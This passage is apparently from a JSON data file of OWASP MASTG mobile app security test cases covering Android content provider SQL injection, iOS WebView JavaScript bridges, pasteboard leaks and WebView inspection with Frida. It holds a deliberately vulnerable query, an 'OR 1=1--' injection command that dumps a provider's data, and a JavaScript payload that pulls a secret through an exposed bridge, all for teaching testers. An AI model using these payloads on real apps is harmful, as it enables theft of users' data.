        "details": "<h2>Overview</h2><p>To test for <a href=\"https://mas.owasp.org/MASTG/0x04h-Testing-Code-Quality/#injection-flaws\" rel=\"noopener noreferrer\" target=\"_blank\">injection flaws</a> you need to first rely on other tests and check for functionality that might have been exposed:</p><ul><li><em><a href=\"https://mas.owasp.org/MASTG-TEST-0028\" rel=\"noopener noreferrer\" target=\"_blank\"> Testing Deep Links</a></em></li><li><em><a href=\"https://mas.owasp.org/MASTG-TEST-0029\" rel=\"noopener noreferrer\" target=\"_blank\"> Testing for Sensitive Functionality Exposure Through IPC</a></em></li><li><em><a href=\"https://mas.owasp.org/MASTG-TEST-0035\" rel=\"noopener noreferrer\" target=\"_blank\"> Testing for Overlay Attacks</a></em></li></ul><h2></h2><h2>Static Analysis</h2><p>An example of a vulnerable IPC mechanism is shown below.</p><p>You can use <em>ContentProviders</em> to access database information, and you can probe services to see if they return data. If data is not validated properly, the content provider may be prone to SQL injection while other apps are interacting with it. See the following vulnerable implementation of a <em>ContentProvider</em>.</p><pre>&lt;provider\n    android:name=\".OMTG_CODING_003_SQL_Injection_Content_Provider_Implementation\"\n    android:authorities=\"sg.vp.owasp_mobile.provider.College\"&gt;\n&lt;/provider&gt;\n</pre><p>The AndroidManifest.xml above defines a content provider that's exported and therefore available to all other apps. The query function in the OMTG_CODING_003_SQL_Injection_Content_Provider_Implementation.java class should be inspected.</p><pre>@Override\npublic Cursor query(Uri uri, String[] projection, String selection,String[] selectionArgs, String sortOrder) {\n    SQLiteQueryBuilder qb = new SQLiteQueryBuilder();\n    qb.setTables(STUDENTS_TABLE_NAME);\n\n    switch (uriMatcher.match(uri)) {\n        case STUDENTS:\n            qb.setProjectionMap(STUDENTS_PROJECTION_MAP);\n            break;\n\n        case STUDENT_ID:\n            // SQL Injection when providing an ID\n            qb.appendWhere( _ID + \"=\" + uri.getPathSegments().get(1));\n            Log.e(\"appendWhere\",uri.getPathSegments().get(1).toString());\n            break;\n\n        default:\n            throw new IllegalArgumentException(\"Unknown URI \" + uri);\n    }\n\n    if (sortOrder == null || sortOrder == \"\"){\n        /**\n         * By default sort on student names\n         */\n        sortOrder = NAME;\n    }\n    Cursor c = qb.query(db, projection, selection, selectionArgs,null, null, sortOrder);\n\n    /**\n     * register to watch a content URI for changes\n     */\n    c.setNotificationUri(getContext().getContentResolver(), uri);\n    return c;\n}\n</pre><p>While the user is providing a STUDENT_ID at content://sg.vp.owasp_mobile.provider.College/students, the query statement is prone to SQL injection. Obviously <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html\" rel=\"noopener noreferrer\" target=\"_blank\">prepared statements ↗</a> must be used to avoid SQL injection, but <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html\" rel=\"noopener noreferrer\" target=\"_blank\">input validation ↗</a> should also be applied so that only input that the app is expecting is processed.</p><p>All app functions that process data coming in through the UI should implement input validation:</p><ul><li>For user interface input, <a href=\"https://github.com/ragunathjawahar/android-saripaar\" rel=\"noopener noreferrer\" target=\"_blank\">Android Saripaar v2 ↗</a> can be used.</li><li>For input from IPC or URL schemes, a validation function should be created. For example, the following determines whether the <a href=\"https://stackoverflow.com/questions/11241690/regex-for-checking-if-a-string-is-strictly-alphanumeric\" rel=\"noopener noreferrer\" target=\"_blank\">string is alphanumeric ↗</a>:</li></ul><pre>public boolean isAlphaNumeric(String s){\n    String pattern= \"^[a-zA-Z0-9]*$\";\n    return s.matches(pattern);\n}\n</pre><p>An alternative to validation functions is type conversion, with, for example, Integer.parseInt if only integers are expected. The <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html\" rel=\"noopener noreferrer\" target=\"_blank\">OWASP Input Validation Cheat Sheet ↗</a> contains more information about this topic.</p><h2></h2><h2>Dynamic Analysis</h2><p>The tester should manually test the input fields with strings like OR 1=1-- if, for example, a local SQL injection vulnerability has been identified.</p><p>On a rooted device, the command content can be used to query the data from a content provider. The following command queries the vulnerable function described above.</p><pre># content query --uri content://sg.vp.owasp_mobile.provider.College/students\n</pre><p>SQL injection can be exploited with the following command. Instead of getting the record for Bob only, the user can retrieve all data.</p><pre># content query --uri content://sg.vp.owasp_mobile.provider.College/students --where \"name='Bob') OR 1=1--''\"\n</pre>",
        "code": "MASTG-TEST-0025",
        "sort_order": 90
    },
    {
        "tags":
        [
            "MASTG-TEST-0078: Determining Whether Native Methods Are Exposed Through WebViews"
        ],
        "testcase": "Determining Whether Native Methods Are Exposed Through WebViews",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><h3>Testing UIWebView JavaScript to Native Bridges</h3><p>Search for code that maps native objects to the JSContext associated with a WebView and analyze what functionality it exposes, for example no sensitive data should be accessible and exposed to WebViews.</p><p>In Objective-C, the JSContext associated with a UIWebView is obtained as follows:</p><pre>[webView valueForKeyPath:@\"documentView.webView.mainFrame.javaScriptContext\"]\n</pre><h3>Testing WKWebView JavaScript to Native Bridges</h3><p>Verify if a JavaScript to native bridge exists by searching for WKScriptMessageHandler and check all exposed methods. Then verify how the methods are called.</p><p>The following example from <a href=\"https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/WKWebViewPreferencesManager.swift#L98\" rel=\"noopener noreferrer\" target=\"_blank\">\"Where's My Browser?\" ↗</a> demonstrates this.</p><p>First we see how the JavaScript bridge is enabled:</p><pre>func enableJavaScriptBridge(_ enabled: Bool) {\n    options_dict[\"javaScriptBridge\"]?.value = enabled\n    let userContentController = wkWebViewConfiguration.userContentController\n    userContentController.removeScriptMessageHandler(forName: \"javaScriptBridge\")\n\n    if enabled {\n            let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()\n            userContentController.add(javaScriptBridgeMessageHandler, name: \"javaScriptBridge\")\n    }\n}\n</pre><p>Adding a script message handler with name \"name\" (or \"javaScriptBridge\" in the example above) causes the JavaScript function window.webkit.messageHandlers.myJavaScriptMessageHandler.postMessage to be defined in all frames in all web views that use the user content controller. It can be then <a href=\"https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/d4e2d9efbde8841bf7e4a8800418dda6bb116ec6/WheresMyBrowser/web/WKWebView/scenario3.html#L33\" rel=\"noopener noreferrer\" target=\"_blank\">used from the HTML file like this ↗</a>:</p><pre>function invokeNativeOperation() {\n    value1 = document.getElementById(\"value1\").value\n    value2 = document.getElementById(\"value2\").value\n    window.webkit.messageHandlers.javaScriptBridge.postMessage([\"multiplyNumbers\", value1, value2]);\n}\n</pre><p>The called function resides in <a href=\"https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/JavaScriptBridgeMessageHandler.swift#L29\" rel=\"noopener noreferrer\" target=\"_blank\">JavaScriptBridgeMessageHandler.swift ↗</a>:</p><pre>class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {\n\n//...\n\ncase \"multiplyNumbers\":\n\n        let arg1 = Double(messageArray[1])!\n        let arg2 = Double(messageArray[2])!\n        result = String(arg1 * arg2)\n//...\n\nlet javaScriptCallBack = \"javascriptBridgeCallBack('\\(functionFromJS)','\\(result)')\"\nmessage.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)\n</pre><p>The problem here is that the JavaScriptBridgeMessageHandler not only contains that function, it also exposes a sensitive function:</p><pre>case \"getSecret\":\n        result = \"XSRSOGKC342\"\n</pre><h2></h2><h2>Dynamic Analysis</h2><p>At this point you've surely identified all potentially interesting WebViews in the iOS app and got an overview of the potential attack surface (via static analysis, the dynamic analysis techniques that we have seen in previous sections or a combination of them). This would include HTML and JavaScript files, usage of the JSContext / JSExport for UIWebView and WKScriptMessageHandler for WKWebView, as well as which functions are exposed and present in a WebView.</p><p>Further dynamic analysis can help you exploit those functions and get sensitive data that they might be exposing. As we have seen in the static analysis, in the previous example it was trivial to get the secret value by performing reverse engineering (the secret value was found in plain text inside the source code) but imagine that the exposed function retrieves the secret from secure storage. In this case, only dynamic analysis and exploitation would help.</p><p>The procedure for exploiting the functions starts with producing a JavaScript payload and injecting it into the file that the app is requesting. The injection can be accomplished via various techniques, for example:</p><ul><li>If some of the content is loaded insecurely from the Internet over HTTP (mixed content), you can try to implement a MITM attack.</li><li>You can always perform dynamic instrumentation and inject the JavaScript payload by using frameworks like Frida and the corresponding JavaScript evaluation functions available for the iOS WebViews (<a href=\"https://developer.apple.com/documentation/uikit/uiwebview/1617963-stringbyevaluatingjavascriptfrom?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">stringByEvaluatingJavaScriptFromString: ↗</a> for UIWebView and <a href=\"https://developer.apple.com/documentation/webkit/wkwebview/1415017-evaluatejavascript?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">evaluateJavaScript:completionHandler: ↗</a> for WKWebView).</li></ul><p>In order to get the secret from the previous example of the \"Where's My Browser?\" app, you can use one of these techniques to inject the following payload that will reveal the secret by writing it to the \"result\" field of the WebView:</p><pre>function javascriptBridgeCallBack(name, value) {\n    document.getElementById(\"result\").innerHTML=value;\n};\nwindow.webkit.messageHandlers.javaScriptBridge.postMessage([\"getSecret\"]);\n</pre><p>Of course, you may also use the Exploitation Helper it provides:</p><p>See another example for a vulnerable iOS app and function that is exposed to a WebView in [#thiel2] page 156.</p>",
        "code": "MASTG-TEST-0078",
        "sort_order": 83
    },
    {
        "tags":
        [
            "MASTG-TEST-0277: Sensitive Data in the iOS General Pasteboard at Runtime"
        ],
        "testcase": "Sensitive Data in the iOS General Pasteboard at Runtime",
        "details": "<h2>Overview</h2><p>This test is the dynamic counterpart to <em><a href=\"https://mas.owasp.org/MASTG-TEST-0276\" rel=\"noopener noreferrer\" target=\"_blank\"> Use of the iOS General Pasteboard</a></em>.</p><p>In this case we'll monitor the <a href=\"https://mas.owasp.org/MASTG/0x06h-Testing-Platform-Interaction/#pasteboard\" rel=\"noopener noreferrer\" target=\"_blank\">pasteboard</a> for sensitive data being written to it at runtime. Note that this can be challenging to detect, as it requires the app to be running and the pasteboard to be modified while the test is being executed. You can trigger the pasteboard by manually entering sensitive data into the app, such as passwords or personal information, while the test is running. Or you can do it automatically by using a script that simulates user input or modifies the pasteboard directly.</p><h2></h2><h2>Steps</h2><ol><li>Monitor the pasteboard for sensitive data using <em><a href=\"https://mas.owasp.org/MASTG-TECH-0134\" rel=\"noopener noreferrer\" target=\"_blank\"> Monitoring the Pasteboard</a></em>.</li><li>Run the app and perform actions that may write sensitive data to the pasteboard, such as copying passwords or personal information.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of pasteboard items that were written during the test.</p><h2></h2><h2>Evaluation</h2><p>The test fails if sensitive data is traced during a write operation to the general pasteboard specifically.</p>",
        "code": "MASTG-TEST-0277",
        "sort_order": 85
    },
    {
        "tags":
        [
            "MASTG-TEST-0279: Pasteboard Contents Not Expiring"
        ],
        "testcase": "Pasteboard Contents Not Expiring",
        "details": "<h2>Overview</h2><p>This test checks if the app sets an expiration date for the contents of the general <a href=\"https://mas.owasp.org/MASTG/0x06h-Testing-Platform-Interaction/#pasteboard\" rel=\"noopener noreferrer\" target=\"_blank\">pasteboard</a> using the UIPasteboard.setItems(_:options:) method with the UIPasteboard.Options.expirationDate option. If sensitive data is left in the pasteboard without an expiration date, it can be accessed by other apps indefinitely, leading to potential data leaks.</p><h2></h2><h2>Steps</h2><ol><li>Run a static analysis scan using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> to detect usage of the <a href=\"https://developer.apple.com/documentation/uikit/uipasteboard/1622106-generalpasteboard\" rel=\"noopener noreferrer\" target=\"_blank\">UIPasteboard.general ↗</a> property.</li><li>Run a static analysis scan using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> to detect usage of the UIPasteboard.setItems(_:options:) method.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where relevant APIs are used.</p><h2></h2><h2>Evaluation</h2><p>The test fails if the app uses the general pasteboard without setting an expiration date for its contents. Specifically, ensure that the UIPasteboard.setItems(_:options:) method is called with the UIPasteboard.Options.expirationDate option.</p>",
        "code": "MASTG-TEST-0279",
        "sort_order": 87
    },
    {
        "tags":
        [
            "MASTG-TEST-0278: Pasteboard Contents Not Cleared After Use"
        ],
        "testcase": "Pasteboard Contents Not Cleared After Use",
        "details": "<h2>Overview</h2><p>This test checks if the app clears the contents of the general <a href=\"https://mas.owasp.org/MASTG/0x06h-Testing-Platform-Interaction/#pasteboard\" rel=\"noopener noreferrer\" target=\"_blank\">pasteboard</a> when it moves to the background or terminates. If sensitive data is left in the pasteboard, it can be accessed by other apps, leading to potential data leaks.</p><p>Apps can clear the contents of the general pasteboard by setting UIPasteboard.general.items = [] in the appropriate lifecycle methods, such as applicationDidEnterBackground: or applicationWillTerminate:.</p><h2></h2><h2>Steps</h2><ol><li>Run a static analysis scan using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> to detect usage of the <a href=\"https://developer.apple.com/documentation/uikit/uipasteboard/1622106-generalpasteboard\" rel=\"noopener noreferrer\" target=\"_blank\">UIPasteboard.general ↗</a> property.</li><li>Run a static analysis scan using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> to detect usage of the <a href=\"https://developer.apple.com/documentation/uikit/uipasteboard/setitems(_:options:)\" rel=\"noopener noreferrer\" target=\"_blank\">UIPasteboard.setItems ↗</a> method.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where relevant APIs are used.</p><h2></h2><h2>Evaluation</h2><p>The test fails if the app uses the general pasteboard and does not clear its contents when moving to the background or terminating. Specifically, it should be verified that there are calls to UIPasteboard.setItems with an empty array ([]) in the appropriate lifecycle methods.</p>",
        "code": "MASTG-TEST-0278",
        "sort_order": 86
    },
    {
        "tags":
        [
            "MASTG-TEST-0002: Testing Local Storage for Input Validation"
        ],
        "testcase": "Testing Local Storage for Input Validation",
        "details": "<h2>Overview</h2><p>For any publicly accessible data storage, any process can override the data. This means that input validation needs to be applied the moment the data is read back again.</p><p>Note: The same is true for private accessible data on a rooted device</p><h2></h2><h2>Static analysis</h2><h3>Using Shared Preferences</h3><p>When you use the SharedPreferences.Editor to read or write int/boolean/long values, you cannot check whether the data is overridden or not. However: it can hardly be used for actual attacks other than chaining the values (e.g. no additional exploits can be packed which will take over the control flow). In the case of a String or a StringSet you should be careful with how the data is interpreted. Using reflection based persistence? Check the section on \"Testing Object Persistence\" for Android to see how it should be validated. Using the SharedPreferences.Editor to store and read certificates or keys? Make sure you have patched your security provider given vulnerabilities such as found in <a href=\"https://www.cvedetails.com/cve/CVE-2018-1000613/\" rel=\"noopener noreferrer\" target=\"_blank\">Bouncy Castle ↗</a>.</p><p>In all cases, having the content HMACed can help to ensure that no additions and/or changes have been applied.</p><h3>Using Other Storage Mechanisms</h3><p>In case other public storage mechanisms (than the SharedPreferences.Editor) are used, the data needs to be validated the moment it is read from the storage mechanism.</p>",
        "code": "MASTG-TEST-0002",
        "sort_order": 89
    },
    {
        "tags":
        [
            "MASTG-TEST-0076: Testing iOS WebViews"
        ],
        "testcase": "Testing iOS WebViews",
        "details": "<h2>Overview</h2><h2></h2><h2>Static Analysis</h2><p>For the static analysis we will focus mostly on the following points having UIWebView and WKWebView under scope.</p><ul><li>Identifying WebView usage</li><li>Testing if JavaScript is Enabled</li><li>Testing for Mixed Content</li><li>Testing for WebView URI Manipulation</li></ul><h3>Identifying WebView Usage</h3><p>Look out for usages of the above mentioned WebView classes by searching in Xcode.</p><p>In the compiled binary you can search in its symbols or strings, for example using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0129\" rel=\"noopener noreferrer\" target=\"_blank\"> rabin2</a></em> like this:</p><p>UIWebView</p><pre>$ rabin2 -zz ./WheresMyBrowser | egrep \"UIWebView$\"\n489 0x0002fee9 0x10002fee9   9  10 (5.__TEXT.__cstring) ascii UIWebView\n896 0x0003c813 0x0003c813  24  25 () ascii @_OBJC_CLASS_$_UIWebView\n1754 0x00059599 0x00059599  23  24 () ascii _OBJC_CLASS_$_UIWebView\n</pre><p>WKWebView</p><pre>$ rabin2 -zz ./WheresMyBrowser | egrep \"WKWebView$\"\n490 0x0002fef3 0x10002fef3   9  10 (5.__TEXT.__cstring) ascii WKWebView\n625 0x00031670 0x100031670  17  18 (5.__TEXT.__cstring) ascii unwindToWKWebView\n904 0x0003c960 0x0003c960  24  25 () ascii @_OBJC_CLASS_$_WKWebView\n1757 0x000595e4 0x000595e4  23  24 () ascii _OBJC_CLASS_$_WKWebView\n</pre><p>Alternatively you can also search for known methods of these WebView classes. For example, search for the method used to initialize a WKWebView (<a href=\"https://developer.apple.com/documentation/webkit/wkwebview/1414998-init\" rel=\"noopener noreferrer\" target=\"_blank\">init(frame:configuration:) ↗</a>):</p><pre>$ rabin2 -zzq ./WheresMyBrowser | egrep \"WKWebView.*frame\"\n0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC\n0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO\n0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC\n0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO\n</pre><p>You can also demangle it:</p><pre>$ xcrun swift-demangle __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO\n\n---&gt; @nonobjc __C.WKWebView.init(frame: __C_Synthesized.CGRect,\n                                configuration: __C.WKWebViewConfiguration) -&gt; __C.WKWebView\n</pre><h3>Testing if JavaScript is Enabled</h3><p>First of all, remember that JavaScript cannot be disabled for UIWebViews.</p><p>For WKWebViews, as a best practice, JavaScript should be disabled unless it is explicitly required. To verify that JavaScript was properly disabled search the project for usages of WKPreferences and ensure that the <a href=\"https://developer.apple.com/documentation/webkit/wkpreferences/1536203-javascriptenabled\" rel=\"noopener noreferrer\" target=\"_blank\">javaScriptEnabled ↗</a> property is set to false:</p><pre>let webPreferences = WKPreferences()\nwebPreferences.javaScriptEnabled = false\n</pre><p>If only having the compiled binary you can search for this in it using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0129\" rel=\"noopener noreferrer\" target=\"_blank\"> rabin2</a></em>:</p><pre>$ rabin2 -zz ./WheresMyBrowser | grep -i \"javascriptenabled\"\n391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT.__objc_methname) ascii javaScriptEnabled\n392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT.__objc_methname) ascii setJavaScriptEnabled:\n</pre><p>If user scripts were defined, they will continue running as the javaScriptEnabled property won't affect them. See <a href=\"https://developer.apple.com/documentation/webkit/wkusercontentcontroller\" rel=\"noopener noreferrer\" target=\"_blank\">WKUserContentController ↗</a> and <a href=\"https://developer.apple.com/documentation/webkit/wkuserscript\" rel=\"noopener noreferrer\" target=\"_blank\">WKUserScript ↗</a> for more information on injecting user scripts to WKWebViews.</p><h3>Testing for Mixed Content</h3><p>In contrast to UIWebViews, when using WKWebViews it is possible to detect <a href=\"https://developers.google.com/web/fundamentals/security/prevent-mixed-content/fixing-mixed-content?hl=en\" rel=\"noopener noreferrer\" target=\"_blank\">mixed content ↗</a> (HTTP content loaded from a HTTPS page). By using the method <a href=\"https://developer.apple.com/documentation/webkit/wkwebview/1415002-hasonlysecurecontent\" rel=\"noopener noreferrer\" target=\"_blank\">hasOnlySecureContent ↗</a> it can be verified whether all resources on the page have been loaded through securely encrypted connections. This example from [#thiel2] (see page 159 and 160) uses this to ensure that only content loaded via HTTPS is shown to the user, otherwise an alert is displayed telling the user that mixed content was detected.</p><p>In the compiled binary you can use <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0129\" rel=\"noopener noreferrer\" target=\"_blank\"> rabin2</a></em>:</p><pre>$ rabin2 -zz ./WheresMyBrowser | grep -i \"hasonlysecurecontent\"\n\n# nothing found\n</pre><p>In this case, the app does not make use of this.</p><p>In addition, if you have the original source code or the IPA, you can inspect the embedded HTML files and verify that they do not include mixed content. Search for http:// in the source and inside tag attributes, but remember that this might give false positives as, for example, finding an anchor tag &lt;a&gt; that includes a http:// inside its href attribute does not always present a mixed content issue. Learn more about mixed content in the <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content\" rel=\"noopener noreferrer\" target=\"_blank\">MDN Web Docs ↗</a>.</p><h3>Testing for WebView URI Manipulation</h3><p>Make sure that the WebView's URI cannot be manipulated by the user in order to load other types of resources than necessary for the functioning of the WebView. This can be specifically dangerous when the WebView's content is loaded from the local file system, allowing the user to navigate to other resources within the application.</p><h2></h2><h2>Dynamic Analysis</h2><p>For the dynamic analysis we will address the same points from the static analysis.</p><ul><li>Enumerating WebView Instances</li><li>Testing if JavaScript is Enabled</li><li>Testing for Mixed Content</li></ul><p>It is possible to identify WebViews and obtain all their properties on runtime by performing dynamic instrumentation. This is very useful when you don't have the original source code.</p><p>For the following examples, we will keep using the <a href=\"https://github.com/authenticationfailure/WheresMyBrowser.iOS/\" rel=\"noopener noreferrer\" target=\"_blank\">\"Where's My Browser?\" ↗</a> app and Frida REPL.</p><h3>Enumerating WebView Instances</h3><p>Once you've identified a WebView in the app, you may inspect the heap in order to find instances of one or several of the WebViews that we have seen above.</p><p>For example, if you use Frida you can do so by inspecting the heap via \"ObjC.choose()\"</p><pre>ObjC.choose(ObjC.classes['UIWebView'], {\n  onMatch: function (ui) {\n    console.log('onMatch: ', ui);\n    console.log('URL: ', ui.request().toString());\n  },\n  onComplete: function () {\n    console.log('done for UIWebView!');\n  }\n});\n\nObjC.choose(ObjC.classes['WKWebView'], {\n  onMatch: function (wk) {\n    console.log('onMatch: ', wk);\n    console.log('URL: ', wk.URL().toString());\n  },\n  onComplete: function () {\n    console.log('done for WKWebView!');\n  }\n});\n\nObjC.choose(ObjC.classes['SFSafariViewController'], {\n  onMatch: function (sf) {\n    console.log('onMatch: ', sf);\n  },\n  onComplete: function () {\n    console.log('done for SFSafariViewController!');\n  }\n});\n</pre><p>For the UIWebView and WKWebView WebViews we also print the associated URL for the sake of completion.</p><p>In order to ensure that you will be able to find the instances of the WebViews in the heap, be sure to first navigate to the WebView you've found. Once there, run the code above, e.g. by copying into the Frida REPL:</p><pre>$ frida -U com.authenticationfailure.WheresMyBrowser\n\n# copy the code and wait ...\n\nonMatch:  &lt;UIWebView: 0x14fd25e50; frame = (0 126; 320 393);\n                autoresize = RM+BM; layer = &lt;CALayer: 0x1c422d100&gt;&gt;\nURL:  &lt;NSMutableURLRequest: 0x1c000ef00&gt; {\n  URL: file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/\n          Library/UIWebView/scenario1.html, Method GET, Headers {\n    Accept =     (\n        \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\"\n    );\n    \"Upgrade-Insecure-Requests\" =     (\n        1\n    );\n    \"User-Agent\" =     (\n        \"Mozilla/5.0 (iPhone; CPU iPhone ... AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/...\"\n    );\n} }\n</pre><p>Now we quit with q and open another WebView (WKWebView in this case). It also gets detected if we repeat the previous steps:</p><pre>$ frida -U com.authenticationfailure.WheresMyBrowser\n\n# copy the code and wait ...\n\nonMatch:  &lt;WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = &lt;CALayer: 0x1c4238f20&gt;&gt;\nURL:  file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/\n            Library/WKWebView/scenario1.html\n</pre><p>We will extend this example in the following sections in order to get more information from the WebViews. We recommend to store this code to a file, e.g. webviews_inspector.js and run it like this:</p><pre>frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js\n</pre><h3>Checking if JavaScript is Enabled</h3><p>Remember that if a UIWebView is being used, JavaScript is enabled by default and there's no possibility to disable it.</p><p>For WKWebView, you should verify if JavaScript is enabled. Use <a href=\"https://developer.apple.com/documentation/webkit/wkpreferences/1536203-javascriptenabled\" rel=\"noopener noreferrer\" target=\"_blank\">javaScriptEnabled ↗</a> from WKPreferences for this.</p><p>Extend the previous script with the following line:</p><pre>ObjC.choose(ObjC.classes['WKWebView'], {\n  onMatch: function (wk) {\n    console.log('onMatch: ', wk);\n    console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());\n//...\n  }\n});\n</pre><p>The output shows now that, in fact, JavaScript is enabled:</p><pre>$ frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js\n\nonMatch:  &lt;WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = &lt;CALayer: 0x1c4238f20&gt;&gt;\n\njavaScriptEnabled:  true\n</pre><h3>Testing for Mixed Content</h3><p>The UIWebView class does not provide a method for verifying that only secure content is allowed. However, <a href=\"https://developer.apple.com/documentation/safari-technology-preview-release-notes/stp-release-7\" rel=\"noopener noreferrer\" target=\"_blank\">starting on iOS 10 ↗</a>, the <a href=\"https://w3c.github.io/webappsec-upgrade-insecure-requests/#upgrade-insecure-requests\" rel=\"noopener noreferrer\" target=\"_blank\">Upgrade-Insecure-Requests ↗</a> CSP (Content Security Policy) directive was introduced to WebKit, the browser engine powering the iOS WebViews. This directive can be used to instruct the browser to upgrade insecure requests to secure requests. This is a good practice to prevent mixed content issues.</p><p>For WKWebView's, you may call the method <a href=\"https://developer.apple.com/documentation/webkit/wkwebview/1415002-hasonlysecurecontent\" rel=\"noopener noreferrer\" target=\"_blank\">hasOnlySecureContent ↗</a> for each of the WKWebViews found in the heap. Remember to do so once the WebView has loaded.</p><p>Extend the previous script with the following line:</p><pre>ObjC.choose(ObjC.classes['WKWebView'], {\n  onMatch: function (wk) {\n    console.log('onMatch: ', wk);\n    console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());\n    //...\n      }\n    });\n</pre><p>The output shows that some of the resources on the page have been loaded through insecure connections:</p><pre>$ frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js\n\nonMatch:  &lt;WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = &lt;CALayer: 0x1c4238f20&gt;&gt;\n\nhasOnlySecureContent:  false\n</pre>",
        "code": "MASTG-TEST-0076",
        "sort_order": 81
    },
    {
        "tags":
        [
            "MASTG-TEST-0280: Pasteboard Contents Not Restricted to Local Device"
        ],
        "testcase": "Pasteboard Contents Not Restricted to Local Device",
        "details": "<h2>Overview</h2><p>This test checks if the app restricts the contents of the general <a href=\"https://mas.owasp.org/MASTG/0x06h-Testing-Platform-Interaction/#pasteboard\" rel=\"noopener noreferrer\" target=\"_blank\">pasteboard</a> to the local device by using the UIPasteboard.setItems(_:options:) method with the UIPasteboard.OptionsKey.localOnly option. If sensitive data is placed in the general pasteboard without this restriction, it can be synced across devices via Universal Clipboard, leading to potential data leaks.</p><h2></h2><h2>Steps</h2><ol><li>Run a static analysis scan using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> to detect usage of the <a href=\"https://developer.apple.com/documentation/uikit/uipasteboard/1622106-generalpasteboard\" rel=\"noopener noreferrer\" target=\"_blank\">UIPasteboard.general ↗</a> property.</li><li>Run a static analysis scan using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> to detect usage of the UIPasteboard.setItems(_:options:) method.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where relevant APIs are used.</p><h2></h2><h2>Evaluation</h2><p>The test fails if the app uses the general pasteboard without restricting its contents to the local device. Specifically, ensure that the UIPasteboard.setItems(_:options:) method is called with the UIPasteboard.Options.localOnly option.</p>",
        "code": "MASTG-TEST-0280",
        "sort_order": 88
    },
    {
        "tags":
        [
            "MASTG-TEST-0276: Use of the iOS General Pasteboard"
        ],
        "testcase": "Use of the iOS General Pasteboard",
        "details": "<h2>Overview</h2><p>This test checks whether the app uses the systemwide general <a href=\"https://mas.owasp.org/MASTG/0x06h-Testing-Platform-Interaction/#pasteboard\" rel=\"noopener noreferrer\" target=\"_blank\">pasteboard</a>, which is persistent across device restarts and app uninstalls and is accessible by all foreground apps and, in some cases, other devices. Placing sensitive data here may pose a privacy risk.</p><p>The test statically analyzes the code for use of the general pasteboard (<a href=\"https://developer.apple.com/documentation/uikit/uipasteboard/general\" rel=\"noopener noreferrer\" target=\"_blank\">UIPasteboard.general ↗</a>) and checks whether sensitive data is written using any of the following methods:</p><ul><li><a href=\"https://developer.apple.com/documentation/uikit/uipasteboard/additems(_:)\" rel=\"noopener noreferrer\" target=\"_blank\">addItems ↗</a></li><li><a href=\"https://developer.apple.com/documentation/uikit/uipasteboard/setitems(_:options:)\" rel=\"noopener noreferrer\" target=\"_blank\">setItems ↗</a></li><li><a href=\"https://developer.apple.com/documentation/uikit/uipasteboard/setdata(_:forpasteboardtype:)\" rel=\"noopener noreferrer\" target=\"_blank\">setData ↗</a></li><li><a href=\"https://developer.apple.com/documentation/uikit/uipasteboard/setvalue(_:forpasteboardtype:)\" rel=\"noopener noreferrer\" target=\"_blank\">setValue ↗</a></li></ul><h2></h2><h2>Steps</h2><ol><li>Run a static analysis scan using <em><a 